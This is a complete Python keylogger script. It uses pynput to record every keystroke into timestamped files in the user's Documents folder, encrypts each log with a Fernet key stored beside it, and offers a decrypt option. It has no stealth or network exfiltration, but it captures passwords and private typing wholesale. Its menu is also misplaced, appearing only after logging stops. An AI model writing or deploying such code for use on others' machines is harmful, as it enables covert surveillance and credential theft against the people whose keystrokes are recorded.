import os
from datetime import datetime
from pynput.keyboard import Key, Listener
import logging
from cryptography.fernet import Fernet

# Set up logging directory and file
log_dir = os.path.expanduser("~/Documents/KeyLogs/")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Generate a key for encryption and save it to a file
key_file = os.path.join(log_dir, "key.key")
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, 'wb') as f:
        f.write(key)
else:
    with open(key_file, 'rb') as f:
        key = f.read()

# Create a Fernet object with the key
cipher_suite = Fernet(key)

# Set up logging file with date and time
log_filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
log_file = os.path.join(log_dir, log_filename)
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

# Log the start of the logging session with a timestamp and date stamp
with open(log_file, 'a') as f:
    f.write(f"\nLogging session started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    f.write("-" * 50 + "\n")

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == Key.esc:
        # Log the end of the logging session with a timestamp and date stamp
        with open(log_file, 'a') as f:
            f.write("-" * 50 + "\n")
            f.write(f"Logging session ended at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        # Encrypt the log file
        encrypt_file(log_file)
        # Stop listener
        return False

def encrypt_file(file_path):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    encrypted_data = cipher_suite.encrypt(file_data)
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

def load_key():
    if os.path.exists(key_file):
        with open(key_file, 'rb') as f:
            key = f.read()
        return key
    else:
        raise FileNotFoundError("Encryption key not found. Make sure key.key is in the correct directory.")

def decrypt_file(file_path):
    key = load_key()
    cipher_suite = Fernet(key)

    with open(file_path, 'rb') as f:
        encrypted_data = f.read()
    
    decrypted_data = cipher_suite.decrypt(encrypted_data)

    # Optionally write the decrypted data back to a file
    decrypted_file_path = file_path.replace(".txt", "_decrypted.txt")
    with open(decrypted_file_path, 'wb') as f:
        f.write(decrypted_data)

    print(f"Decrypted data written to {decrypted_file_path}")

# Start listening for key presses
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Keylogger stopped.")
except Exception as e:
    print(f"Error: {e}")
finally:
    logging.shutdown()

# Example usage for decryption
if __name__ == "__main__":
    action = input("Enter 'log' to start logging or 'decrypt' to decrypt a file: ").strip().lower()
    if action == 'log':
        # Logging is handled in the script execution
        pass
    elif action == 'decrypt':
        encrypted_file_path = input("Enter the path of the encrypted log file: ")
        try:
            decrypt_file(encrypted_file_path)
        except Exception as e:
            print(f"An error occurred: {e}")
    else:
        print("Invalid action. Please enter 'log' or 'decrypt'.")
